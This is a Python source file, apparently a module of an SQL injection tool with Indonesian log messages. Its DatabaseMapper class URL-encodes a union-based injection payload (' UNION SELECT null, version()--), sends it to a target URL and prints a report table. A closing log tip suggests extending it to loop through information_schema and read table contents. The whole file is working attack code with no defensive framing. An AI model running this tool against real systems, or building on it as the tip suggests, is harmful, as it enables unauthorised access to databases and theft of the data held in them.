import re
from urllib.parse import quote
from core.client import HTTPClient
from utils.logger import (
    log_error, 
    log_info, log_success, 
    print_database_table
)

class DatabaseMapper:
    def __init__(self, client:HTTPClient):
        self.client = client
    def dump_database(self, base_url : str):
        log_info("Mempersiapkan payload Union-Based untuk ekstraksi data...")

        payload = " ' UNION SELECT null, version()--"

        #melakukan url encoding agar karakter spesial spasi atau tanda petik aman di kirim 
        encoded_payload= quote(payload)

        log_info("Mengirim payload ekstraksi ke target...")
        res = self.client.send_payload(base_url, encoded_payload)

        if not res["success"]:
            log_error("Gagal terhubung saat mencoba melakukan ekstraksi data.")
            return
        response_text= res["text"]
        log_success(
            "Respons ekstraksi berhasil diterima. Memproses hasil analisis..."
        )

        #menyiapkan data untuk dicetak ke dalam bentuk tabel konsol yang rapi
        columns = ["Komponen Target", "Keterangan / Hasil"]
        rows = [
            ["Teknik Mapping", "Union-Based SQL Injection"],
            ["Payload Terenkode", encoded_payload],
            ["Status Eksekusi", "Berhasil Mengambil Respons Server"],
            ["Ukuran Respons", f"{len(response_text)} Karakter HTML"],
        ]

        #memanggil fungsi tabel dari logger 
        print_database_table("Laporan Hasil Mapping Database", columns, rows)

        log_info(
            "Tips Pengembangan: Kamu bisa memperluas fungsi ini menggunakan perulangan"
            " (looping) untuk membaca isi tabel dari information_schema."
        )



